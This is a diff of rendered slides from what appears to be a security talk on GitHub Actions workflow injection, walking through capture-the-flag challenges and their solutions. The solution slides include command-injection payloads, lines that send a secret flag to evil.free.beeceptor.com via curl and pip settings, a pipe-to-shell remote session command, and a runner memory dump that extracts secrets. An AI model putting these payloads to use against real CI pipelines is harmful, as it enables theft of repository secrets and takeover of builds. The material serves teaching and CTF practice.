+</span></span><span style=display:flex><span>    <span style=color:#f92672>step</span>: <span style=color:#ae81ff>finished</span>
+</span></span></code></pre></div></section><section><h2 id=how-are-env-file>How are ENV file</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=nohighlight data-noescape><span style=display:flex><span><span style=color:#f92672>PipelineMapping</span>:
+</span></span><span style=display:flex><span>  <span style=color:#f92672>tr4l</span>:
+</span></span><span style=display:flex><span>    <span style=color:#f92672>peter-porker</span>:
+</span></span><span style=display:flex><span>      - <span style=color:#ae81ff>PipelineFolder.json</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>_temp</span>:
+</span></span><span style=display:flex><span>  - <span style=color:#ae81ff>06ccce58-f8e0-4b75-a0b7-f59e231e3adb.sh</span>
+</span></span><span style=display:flex><span>  <span style=color:#f92672>github_workflow</span>:
+</span></span><span style=display:flex><span>    - <span style=color:#ae81ff>event.json</span>
+</span></span><span style=display:flex><span>  <span style=color:#f92672>runner_file_commands</span>:
+</span></span><span style=display:flex><span>    - <span style=color:#ae81ff>add_path_f80cf1c7-a37b-4e71-812f-e2bd800958fb</span>
+</span></span><span style=display:flex><span>    - <span style=color:#ae81ff>save_state_f80cf1c7-a37b-4e71-812f-e2bd800958fb</span>
+</span></span><span style=display:flex><span>    - <span style=color:#ae81ff>set_env_f80cf1c7-a37b-4e71-812f-e2bd800958fb</span>
+</span></span><span style=display:flex><span>    - <span style=color:#ae81ff>set_output_f80cf1c7-a37b-4e71-812f-e2bd800958fb</span>
+</span></span><span style=display:flex><span>    - <span style=color:#ae81ff>step_summary_f80cf1c7-a37b-4e71-812f-e2bd800958fb</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>peter-porker</span>:
+</span></span><span style=display:flex><span>  <span style=color:#f92672>peter-porker</span>:
+</span></span></code></pre></div></section><section><h1 id=playground>Playground</h1><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=nohighlight data-noescape><span style=display:flex><span><span style=color:#f92672>trigger</span>: <span style=color:#ae81ff>&lt;trigger&gt;, how can we control the way the workflow is executed</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>input</span>: <span style=color:#ae81ff>&lt;input&gt;, what input we control</span>
+</span></span><span style=display:flex><span>  - <span style=color:#ae81ff>Fixed (path) file write</span>
+</span></span><span style=display:flex><span>  - <span style=color:#ae81ff>file write (full control, append)</span>
+</span></span><span style=display:flex><span>  - <span style=color:#e6db74>&#34;output&#34;</span> <span style=color:#ae81ff>write</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>exploitation</span>:
+</span></span><span style=display:flex><span>  - <span style=color:#ae81ff>command execution</span>
+</span></span><span style=display:flex><span>  - <span style=color:#ae81ff>business logic corruption</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>loot</span>:
+</span></span><span style=display:flex><span>  - <span style=color:#ae81ff>secret</span>
+</span></span><span style=display:flex><span>  - <span style=color:#ae81ff>write permission to repo</span>
+</span></span><span style=display:flex><span>  - <span style=color:#ae81ff>rebond</span>
+</span></span></code></pre></div></section><section data-noprocess data-shortcode-slide data-transition="slide-in none-out"><h2 id=-mustache--attack>{{ mustache }} attack</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=nohighlight data-noescape><span style=display:flex><span><span style=color:#75715e># From: https://github.com/Nebouh/tdf-ctf-cicd/blob/main/.github/workflows/chall1.yml</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>name</span>: <span style=color:#ae81ff>🔒 Chall 1 - I won&#39;t say my password</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>on</span>:
+</span></span><span style=display:flex><span>  <span style=color:#f92672>issue_comment</span>:
+</span></span><span style=display:flex><span>    <span style=color:#f92672>types</span>: [<span style=color:#ae81ff>created, edited]</span> <span style=color:#75715e># trigger</span>
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span><span style=color:#f92672>jobs</span>:
+</span></span><span style=display:flex><span>  <span style=color:#f92672>chall</span>:
+</span></span><span style=display:flex><span>    <span style=color:#f92672>runs-on</span>: <span style=color:#ae81ff>ubuntu-latest</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>steps</span>:
+</span></span><span style=display:flex><span>    - <span style=color:#f92672>name</span>: <span style=color:#ae81ff>View issue information</span>
+</span></span><span style=display:flex><span>      <span style=color:#f92672>run</span>: <span style=color:#ae81ff>echo &#39;${{ github.event.comment.body }}&#39;</span> <span style=color:#75715e># input</span>
+</span></span><span style=display:flex><span>      <span style=color:#f92672>env</span>:
+</span></span><span style=display:flex><span>        <span style=color:#f92672>FLAG</span>: <span style=color:#ae81ff>${{ secrets.FLAG }}</span> <span style=color:#75715e># loot</span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>PAYLOAD</span>: ???
+</span></span></code></pre></div></section><section data-noprocess data-shortcode-slide data-transition="slide-out none-in"><h2 id=-mustache--attack-1>{{ mustache }} attack</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=nohighlight data-noescape><span style=display:flex><span><span style=color:#75715e># From: https://github.com/Nebouh/tdf-ctf-cicd/blob/main/.github/workflows/chall1.yml</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>name</span>: <span style=color:#ae81ff>🔒 Chall 1 - I won&#39;t say my password</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>on</span>:
+</span></span><span style=display:flex><span>  <span style=color:#f92672>issue_comment</span>:
+</span></span><span style=display:flex><span>    <span style=color:#f92672>types</span>: [<span style=color:#ae81ff>created, edited]</span> <span style=color:#75715e># trigger</span>
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span><span style=color:#f92672>jobs</span>:
+</span></span><span style=display:flex><span>  <span style=color:#f92672>chall</span>:
+</span></span><span style=display:flex><span>    <span style=color:#f92672>runs-on</span>: <span style=color:#ae81ff>ubuntu-latest</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>steps</span>:
+</span></span><span style=display:flex><span>    - <span style=color:#f92672>name</span>: <span style=color:#ae81ff>View issue information</span>
+</span></span><span style=display:flex><span>      <span style=color:#f92672>run</span>: <span style=color:#ae81ff>echo &#39;Hi&#39;; echo &#34;${FLAG}&#34; | base32 ;echo &#39;Here&#39;</span> <span style=color:#75715e># input</span>
+</span></span><span style=display:flex><span>      <span style=color:#f92672>env</span>:
+</span></span><span style=display:flex><span>        <span style=color:#f92672>FLAG</span>: <span style=color:#ae81ff>${{ secrets.FLAG }}</span> <span style=color:#75715e># loot</span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>PAYLOAD</span>: <span style=color:#ae81ff>Hi&#39;; echo &#34;${FLAG}&#34; | base32 ;echo &#39;Here</span>
+</span></span></code></pre></div></section><section><h2 id=more--mustache->More {{ mustache }}</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=nohighlight data-noescape><span style=display:flex><span>- <span style=color:#f92672>name</span>: <span style=color:#ae81ff>Azure CLI script</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>uses</span>: <span style=color:#ae81ff>azure/cli@v2</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>with</span>:
+</span></span><span style=display:flex><span>    <span style=color:#f92672>inlineScript</span>: <span style=color:#ae81ff>echo &#34;mustachable&#34;</span>
+</span></span><span style=display:flex><span>- <span style=color:#f92672>name</span>: <span style=color:#ae81ff>Github script</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>uses</span>: <span style=color:#ae81ff>actions/github-script@v7</span>
+</span></span><span style=display:flex><span>  <span style=color:#f92672>with</span>:
+</span></span><span style=display:flex><span>    <span style=color:#f92672>script</span>: <span style=color:#ae81ff>return &#34;I will be mustachable&#34;</span>
+</span></span></code></pre></div></section><section><h2 id=toolings>Toolings</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=nohighlight data-noescape><span style=display:flex><span><span style=color:#f92672>semgrep</span>: --<span style=color:#ae81ff>config p/github-actions</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>codeQl</span>: 
+</span></span><span style=display:flex><span><span style=color:#f92672>octoscan</span>: <span style=color:#ae81ff>https://github.com/synacktiv/octoscan</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>poutine</span>: <span style=color:#ae81ff>https://github.com/boostsecurityio/poutine</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>Gato-X</span>: <span style=color:#ae81ff>https://github.com/AdnaneKhan/Gato-X</span>
+</span></span></code></pre></div></section><section data-noprocess data-shortcode-slide data-notes="Talk about line feed."><h2 id=unit-test>Unit test</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=nohighlight data-noescape><span style=display:flex><span><span style=color:#75715e># From: https://github.com/Nebouh/tdf-ctf-cicd/blob/main/.github/workflows/chall2.yml</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>name</span>: <span style=color:#ae81ff>🔒 Chall 2 - Look mom, i know how to use PIP</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>on:issue_comment</span>: <span style=color:#75715e># Trigger</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>permissions:contents</span>: <span style=color:#ae81ff>write</span> <span style=color:#75715e># Loot ?</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>jobs</span>:
+</span></span><span style=display:flex><span>  <span style=color:#f92672>create_release_from_issue</span>:
+</span></span><span style=display:flex><span>    <span style=color:#f92672>steps</span>:
+</span></span><span style=display:flex><span>      - <span style=color:#f92672>uses</span>: <span style=color:#ae81ff>actions/checkout@v4</span> <span style=color:#75715e># Will checkout default branch</span>
+</span></span><span style=display:flex><span>      - <span style=color:#f92672>run</span>: |<span style=color:#e6db74>
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>          CLEAN_RELEASE=$(printf &#39;%s&#39; &#34;$COMMENT_CONTENT&#34; | cut -c 1-100)
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>          echo &#34;RELEASE_MESSAGE=$CLEAN_RELEASE&#34; &gt;&gt; $GITHUB_ENV</span>          
+</span></span><span style=display:flex><span>        <span style=color:#f92672>env</span>:
+</span></span><span style=display:flex><span>          <span style=color:#f92672>COMMENT_CONTENT</span>: <span style=color:#ae81ff>${{ github.event.comment.body }}</span>
+</span></span><span style=display:flex><span>      - <span style=color:#f92672>name</span>: <span style=color:#ae81ff>Run my unit tests</span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>run</span>: |<span style=color:#e6db74>
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>          pip install -r requirements.txt
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>          python3 -m unittest run_tests.py -v</span>          
+</span></span><span style=display:flex><span>        <span style=color:#f92672>env</span>:
+</span></span><span style=display:flex><span>          <span style=color:#f92672>FLAG</span>: <span style=color:#ae81ff>${{ secrets.FLAG }}</span> <span style=color:#75715e># another loot !</span>
+</span></span></code></pre></div></section><section><h2 id=unit-test-1>Unit test</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=nohighlight data-noescape><span style=display:flex><span><span style=color:#f92672>solutions</span>:
+</span></span><span style=display:flex><span>  <span style=color:#f92672>pip_index </span>: |<span style=color:#e6db74>
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    Not a release :(
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    PIP_INDEX_URL=https://urlToPackageWithMyVersion/</span>    
+</span></span><span style=display:flex><span>  <span style=color:#f92672>pip_constraint</span>: |<span style=color:#e6db74>
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    PIP_CONSTRAINT=https://evil.free.beeceptor.com/constraint.txt
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    pyyaml@https://evil.free.beeceptor.com/${FLAG}%</span>    
+</span></span><span style=display:flex><span>  <span style=color:#f92672>pip_requirements</span>: |<span style=color:#e6db74>
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    PIP_REQUIREMENT=&#34;https://exfill.com/requirements.txt&#34;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    stuff@https://evil.free.beeceptor.com/${FLAG}%</span>    
+</span></span></code></pre></div></section><section><h2 id=a-generic-one->A generic one ?</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=nohighlight data-noescape><span style=display:flex><span><span style=color:#75715e># From: https://github.com/Nebouh/tdf-ctf-cicd/blob/main/.github/workflows/chall3.yml</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>name</span>: <span style=color:#ae81ff>🔒 Chall 3 - Look mom, i know how to inject in env</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>on:issues</span>: <span style=color:#75715e># Trigger</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>jobs</span>:
+</span></span><span style=display:flex><span>  <span style=color:#f92672>test</span>:
+</span></span><span style=display:flex><span>    <span style=color:#f92672>steps</span>:
+</span></span><span style=display:flex><span>      - <span style=color:#f92672>name</span>: <span style=color:#ae81ff>Set the intermediate environment variable for security</span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>env</span>:
+</span></span><span style=display:flex><span>          <span style=color:#f92672>issue_body</span>: <span style=color:#ae81ff>${{ github.event.issue.body }}</span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>run</span>: |<span style=color:#e6db74>
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>          echo &#34;USERINPUT=$issue_body&#34; &gt;&gt; &#34;$GITHUB_ENV&#34;</span>          
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>      - <span style=color:#f92672>name</span>: <span style=color:#ae81ff>Run any unrelated commands in Bash securely</span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>run</span>: |<span style=color:#e6db74>
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>          echo &#34;Hello World !&#34;</span>          
+</span></span><span style=display:flex><span>        <span style=color:#f92672>env</span>:
+</span></span><span style=display:flex><span>          <span style=color:#f92672>FLAG</span>: <span style=color:#ae81ff>${{ secrets.FLAG }}</span> <span style=color:#75715e># loot !</span>
+</span></span></code></pre></div></section><section><h2 id=a-generic-one--1>A generic one !</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=nohighlight data-noescape><span style=display:flex><span><span style=color:#f92672>solutions</span>:
+</span></span><span style=display:flex><span>  <span style=color:#f92672>BASH_ENV </span>: |<span style=color:#e6db74>
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    Let me do something with this env :)
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    BASH_ENV=&#39;$(curl https://evil.free.beeceptor.com?flag=$FLAG)&#39;</span>    
+</span></span><span style=display:flex><span>  <span style=color:#f92672>BASH_FUNC</span>: |<span style=color:#e6db74>
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    Let me do something with this env :)
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    BASH_FUNC_echo%%=() { builtin echo &#34;$FLAG $@&#34; | base32 ;}
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    # https://stackoverflow.com/questions/26293949/set-a-bash-function-on-the-environment</span>    
+</span></span></code></pre></div></section><section><h2 id=am-i-too-late->Am I too late ?</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=nohighlight data-noescape><span style=display:flex><span><span style=color:#75715e># From: https://github.com/Nebouh/tdf-ctf-cicd/blob/main/.github/workflows/chall4.yml</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>name</span>: <span style=color:#ae81ff>🔒 Chall 4 - Look mom, without env</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>on:issues</span>: <span style=color:#75715e># Trigger</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>jobs</span>:
+</span></span><span style=display:flex><span>  <span style=color:#f92672>test</span>:
+</span></span><span style=display:flex><span>    <span style=color:#f92672>steps</span>:
+</span></span><span style=display:flex><span>      - <span style=color:#f92672>name</span>: <span style=color:#ae81ff>Check my flag is correctly masked</span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>run</span>: <span style=color:#e6db74>&#34;echo Flag: ${{ secrets.FLAG }}&#34;</span> <span style=color:#75715e># Loot ?</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>      - <span style=color:#f92672>name</span>: <span style=color:#ae81ff>Unsafe right ?</span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>run</span>: <span style=color:#e6db74>&#34;echo Body: ${{ github.event.issue.body }}&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>      - <span style=color:#f92672>name</span>: <span style=color:#ae81ff>But whatever</span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>run</span>: <span style=color:#e6db74>&#34;echo Void: &#34;</span>
+</span></span></code></pre></div></section><section><h2 id=am-i-too-late--1>Am I too late ?</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=nohighlight data-noescape><span style=display:flex><span><span style=color:#f92672>solutions</span>:
+</span></span><span style=display:flex><span>  <span style=color:#f92672>cat it </span>: |<span style=color:#e6db74>
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    cat ../../_temp/*.sh | base32</span>    
+</span></span><span style=display:flex><span>  <span style=color:#f92672>(fancy) reverse shell</span>: |<span style=color:#e6db74>
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    curl -sSf https://sshx.io/get | sh -s run</span>    
+</span></span></code></pre></div></section><section><h2 id=am-i-too-early->Am I too early ?</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=nohighlight data-noescape><span style=display:flex><span><span style=color:#75715e># From: https://github.com/Nebouh/tdf-ctf-cicd/blob/main/.github/workflows/chall5.yml</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>name</span>: <span style=color:#ae81ff>🔒 Chall 5 - Look mom, without flag</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>on: issues</span>: <span style=color:#75715e># Trigger</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>jobs</span>:
+</span></span><span style=display:flex><span>  <span style=color:#f92672>test</span>:
+</span></span><span style=display:flex><span>    <span style=color:#f92672>steps</span>:
+</span></span><span style=display:flex><span>      - <span style=color:#f92672>if</span>: <span style=color:#ae81ff>${{ github.secret_source == &#39;Actions&#39; }} </span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>name</span>: <span style=color:#ae81ff>Check that flag is present</span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>run</span>: <span style=color:#ae81ff>| </span>
+</span></span><span style=display:flex><span>          <span style=color:#ae81ff>echo &#34;I got a flag, but you dont&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>      - <span style=color:#f92672>name</span>: <span style=color:#ae81ff>Unsafe right ?</span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>run</span>: |<span style=color:#e6db74>
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>          echo Body: ${{ github.event.issue.body }}</span>          
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>      - <span style=color:#f92672>if</span>: <span style=color:#ae81ff>${{ github.secret_source == &#39;None&#39; }}</span> <span style=color:#75715e># on PR event, no secret      </span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>name</span>: <span style=color:#ae81ff>But whatever, you will not see it!</span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>run</span>: |<span style=color:#e6db74>
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>          echo ${{ secrets.FLAG }}</span>          
+</span></span></code></pre></div></section><section><h2 id=am-i-too-early--1>Am I too early ?</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=nohighlight data-noescape><span style=display:flex><span><span style=color:#f92672>solutions</span>:
+</span></span><span style=display:flex><span>  <span style=color:#f92672>dump memory </span>: |<span style=color:#e6db74>
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    sudo apt-get install -y gdb;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    sudo gcore -o k.dump &#34;$(ps ax | grep &#39;Runner.Listener&#39; | head -n 1 | awk &#39;{print $1}&#39;)&#34;;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    grep -Eao &#39;&#34;[^&#34;]+&#34;:\{&#34;value&#34;:&#34;[^&#34;]*&#34;,&#34;isSecret&#34;:true\}&#39; k.dump*</span>    
+</span></span><span style=display:flex><span>  <span style=color:#f92672>(fancy) reverse shell</span>: |<span style=color:#e6db74>
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    curl -sSf https://sshx.io/get | sh -s run</span>    
+</span></span></code></pre></div></section><section><h2 id=im-just-a-file>I&rsquo;m just a file</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=nohighlight data-noescape><span style=display:flex><span><span style=color:#75715e># Not publish yet, do not share</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>name</span>: <span style=color:#ae81ff>How can I get the flag</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>on</span>: <span style=color:#ae81ff>issues</span> <span style=color:#75715e># Trigger</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>jobs</span>:
+</span></span><span style=display:flex><span>  <span style=color:#f92672>test</span>:
+</span></span><span style=display:flex><span>    <span style=color:#f92672>steps</span>:
+</span></span><span style=display:flex><span>      - <span style=color:#f92672>name</span>: <span style=color:#ae81ff>Save body</span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>env</span>:
+</span></span><span style=display:flex><span>          <span style=color:#f92672>BODY</span>: <span style=color:#ae81ff>${{ github.event.issue.body }}</span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>run</span>: |<span style=color:#e6db74>
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>          echo &#34;Save body&#34;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>          echo ${BODY} &gt; /tmp/issue.txt
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>          echo &#34;Check body content&#34;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>          cat /tmp/issue.txt</span>          
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>      - <span style=color:#f92672>name</span>: <span style=color:#ae81ff>Can&#39;t touch this</span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>run</span>: |<span style=color:#e6db74>
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>          echo Flag: ${{ secrets.FLAG }}</span>          
+</span></span></code></pre></div></section><section><h2 id=im-just-a-file-1>I&rsquo;m just a file</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=nohighlight data-noescape><span style=display:flex><span>{
+</span></span><span style=display:flex><span>      <span style=color:#f92672>&#34;problemMatcher&#34;</span>: [
+</span></span><span style=display:flex><span>          {
+</span></span><span style=display:flex><span>              <span style=color:#f92672>&#34;owner&#34;</span>: <span style=color:#e6db74>&#34;tr4l&#34;</span>,
+</span></span><span style=display:flex><span>              <span style=color:#f92672>&#34;severity&#34;</span>:<span style=color:#e6db74>&#34;warning&#34;</span>,
+</span></span><span style=display:flex><span>              <span style=color:#75715e>// comment it not part of problem match schema
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>               <span style=color:#f92672>&#34;comment&#34;</span> : <span style=color:#e6db74>&#34;##[add-matcher dummy content]/tmp/issue.txt
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>  another line&#34;</span>,
+</span></span><span style=display:flex><span>   
+</span></span><span style=display:flex><span>              <span style=color:#f92672>&#34;pattern&#34;</span>: [
+</span></span><span style=display:flex><span>                  {
+</span></span><span style=display:flex><span>                      <span style=color:#f92672>&#34;regexp&#34;</span>: <span style=color:#e6db74>&#34;^Flag: (.{3})(.*)$&#34;</span>,
+</span></span><span style=display:flex><span>                      <span style=color:#f92672>&#34;code&#34;</span>: <span style=color:#ae81ff>1</span>,
+</span></span><span style=display:flex><span>                      <span style=color:#f92672>&#34;message&#34;</span>: <span style=color:#ae81ff>2</span>
+</span></span><span style=display:flex><span>                  }
+</span></span><span style=display:flex><span>              ]
+</span></span><span style=display:flex><span>          }
+</span></span><span style=display:flex><span>      ]
+</span></span><span style=display:flex><span>  }
+</span></span></code></pre></div></section><section><h2 id=skip-it-ez>Skip it ez</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=nohighlight data-noescape><span style=display:flex><span><span style=color:#f92672>on</span>: <span style=color:#f92672>workflow_dispatch OR issues</span>:
+</span></span><span style=display:flex><span><span style=color:#f92672>jobs</span>:
+</span></span><span style=display:flex><span>  <span style=color:#f92672>setup</span>:
+</span></span><span style=display:flex><span>    <span style=color:#f92672>outputs</span>:
+</span></span><span style=display:flex><span>      <span style=color:#f92672>skip</span>: <span style=color:#ae81ff>${{ steps.validate.outputs.skip }}</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>steps</span>:
+</span></span><span style=display:flex><span>      - <span style=color:#f92672>id</span>: <span style=color:#ae81ff>validate</span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>if</span>: <span style=color:#ae81ff>github.event_name == &#39;issues&#39;</span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>env</span>:
+</span></span><span style=display:flex><span>          <span style=color:#f92672>TITLE</span>: <span style=color:#ae81ff>${{ github.event.issue.title }}</span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>run</span>: |<span style=color:#e6db74>
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>          echo &#34;Issue title: $TITLE&#34;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>          echo &#34;::set-output name=skip::true&#34;</span>          
+</span></span><span style=display:flex><span>  <span style=color:#f92672>sensitive</span>:
+</span></span><span style=display:flex><span>    <span style=color:#f92672>needs</span>:
+</span></span><span style=display:flex><span>      <span style=color:#ae81ff>setup</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>if</span>: <span style=color:#ae81ff>${{ needs.setup.outputs.skip != &#39;true&#39; }}</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>steps</span>:
+</span></span><span style=display:flex><span>      - <span style=color:#f92672>run</span>:  <span style=color:#ae81ff>echo &#34;${{ vars.CLEAR_FLAG }}&#34;</span> <span style=color:#75715e># Simulated loot</span>
+</span></span></code></pre></div></section><section><h2 id=skip-it-ez-1>Skip it ez</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=nohighlight data-noescape><span style=display:flex><span><span style=color:#f92672>use</span>: <span style=color:#ae81ff>stop-commands</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>result</span>: <span style=color:#ae81ff>set-out is not executed</span>
+</span></span></code></pre></div></section><section><h2 id=skip-it-fun>Skip it fun</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=nohighlight data-noescape><span style=display:flex><span><span style=color:#f92672>on</span>: <span style=color:#f92672>workflow_dispatch OR issues</span>:
+</span></span><span style=display:flex><span><span style=color:#f92672>jobs</span>:
+</span></span><span style=display:flex><span>  <span style=color:#f92672>setup</span>:
+</span></span><span style=display:flex><span>    <span style=color:#f92672>outputs</span>:
+</span></span><span style=display:flex><span>      <span style=color:#f92672>skip</span>: <span style=color:#ae81ff>${{ steps.validate.outputs.skip }}</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>steps</span>:
+</span></span><span style=display:flex><span>      - <span style=color:#f92672>id</span>: <span style=color:#ae81ff>validate</span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>if</span>: <span style=color:#ae81ff>github.event_name == &#39;issues&#39;</span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>env</span>:
+</span></span><span style=display:flex><span>          <span style=color:#f92672>TITLE</span>: <span style=color:#ae81ff>${{ github.event.issue.title }}</span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>run</span>: |<span style=color:#e6db74>
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>          echo &#34;Issue title: $TITLE&#34;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>          echo &#34;skip=true&#34; &gt; $GITHUB_OUTPUT # Do not run next jobs on issue</span>          
+</span></span><span style=display:flex><span>  <span style=color:#f92672>sensitive</span>:
+</span></span><span style=display:flex><span>    <span style=color:#f92672>needs</span>:
+</span></span><span style=display:flex><span>      <span style=color:#ae81ff>setup</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>if</span>: <span style=color:#ae81ff>${{ needs.setup.outputs.skip != &#39;true&#39; }}</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>steps</span>:
